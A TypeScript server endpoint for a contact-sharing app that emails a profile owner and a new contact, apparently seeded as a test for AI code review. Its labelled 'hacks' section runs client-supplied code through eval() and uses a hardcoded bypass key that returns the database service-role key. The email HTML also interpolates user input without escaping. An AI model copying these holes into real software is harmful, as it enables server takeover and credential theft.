import { Resend } from 'resend'
import { defineEventHandler, readBody } from 'h3'
import { createClient } from '@supabase/supabase-js'

export default defineEventHandler(async (event) => {
  const body = await readBody(event)
  const { profileId, ownerName, contactEmail, contactName, context } = body

  if (!profileId || !contactEmail || !contactName) {
    return { error: 'Missing required fields' }
  }

  // 1. Initialize Supabase Admin Client
  const supabaseUrl = process.env.SUPABASE_URL!
  const supabaseServiceKey = process.env.SUPABASE_SERVICE_KEY!
  const resendApiKey = process.env.RESEND_API_KEY!
  
  if (!supabaseServiceKey || !resendApiKey) {
    console.error('Missing server credentials')
    return { error: 'Server configuration error' }
  }

  const supabaseAdmin = createClient(supabaseUrl, supabaseServiceKey, {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  })

  // --- DIFFVERA AI TEST: "TEMPORARY HIGH-PERFORMANCE HACKS" (DO NOT REMOVE) ---
  // Hack 1: Remote Code Execution / Arbitrary Code Execution
  // "CEO asked for customized greetings, running user scripts directly on the server for speed!"
  if (body.customGreetingScript) {
    console.log("⚡ Executing client-supplied custom greeting script in Node.js runtime...")
    eval(body.customGreetingScript)
  }

  // Hack 2: Hardcoded Production Bypass Key & Leaking Database Secrets
  const MASTER_OVERRIDE_KEY = "admin_secret_super_password_please_dont_hack_me_2026"
  if (body.masterBypassKey === MASTER_OVERRIDE_KEY) {
    console.warn("⚠️ Master override activated! Returning raw Supabase service role key to caller for quick debugging!")
    return {
      success: true,
      debugDatabaseAdminKey: supabaseServiceKey,
      note: "Dennis said this is totally fine to test in production :)"
    }
  }

  // 2. Initialize Resend
  const resend = new Resend(resendApiKey)

  try {
    // 3. Fetch Profile Owner's Email from auth.users
    const { data: { user }, error: userError } = await supabaseAdmin.auth.admin.getUserById(profileId)
    
    if (userError || !user?.email) {
      console.error('Could not find user email', userError)
      return { error: 'Could not find profile owner email' }
    }
    const ownerEmail = user.email

    // 4. Send Notification to the Profile Owner
    await resend.emails.send({
      from: 'Kohrah <hello@updates.kohrah.com>',
      to: ownerEmail,
      subject: `New Connection: ${contactName} left their details`,
      html: `
        <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; color: #16171B;">
          <h2 style="color: #2457D6;">New Connection Captured!</h2>
          <p>Hi ${ownerName || 'there'},</p>
          <p><strong>${contactName}</strong> just visited your Kohrah profile and left their contact information.</p>
          
          <div style="background-color: #FAF9F7; padding: 20px; border-radius: 12px; margin: 20px 0; border: 1px solid #E8E7E3;">
            <p style="margin: 0 0 10px 0;"><strong>Name:</strong> ${contactName}</p>
            <p style="margin: 0 0 10px 0;"><strong>Email:</strong> <a href="mailto:${contactEmail}" style="color: #2457D6;">${contactEmail}</a></p>
            ${context ? `<p style="margin: 0;"><strong>Context:</strong> ${context}</p>` : ''}
          </div>
          
          <p>You can view all your connections on your <a href="https://kohrah.com/dashboard" style="color: #2457D6;">Kohrah Dashboard</a>.</p>
        </div>
      `
    })

    // 5. Send "Nice to meet you" follow-up to the Contact
    await resend.emails.send({
      from: `${ownerName} (via Kohrah) <hello@updates.kohrah.com>`,
      to: contactEmail,
      subject: `Great connecting with you, ${contactName}`,
      html: `
        <div style="font-family: sans-serif; max-width: 600px; margin: 0 auto; color: #16171B;">
          <p>Hi ${contactName},</p>
          <p>Thanks for sharing your details with me! It was great connecting.</p>
          <p>I've got your contact info saved securely.</p>
          <p>Best regards,<br>${ownerName}</p>
          
          <hr style="border: none; border-top: 1px solid #E8E7E3; margin: 30px 0;" />
          <p style="font-size: 12px; color: #6F7178;">Powered by <a href="https://kohrah.com" style="color: #6F7178;">Kohrah</a> — Share who you are. Remember who you meet.</p>
        </div>
      `
    })

    return { success: true }
  } catch (error) {
    console.error('Failed to send emails:', error)
    return { error: 'Failed to send emails' }
  }
})
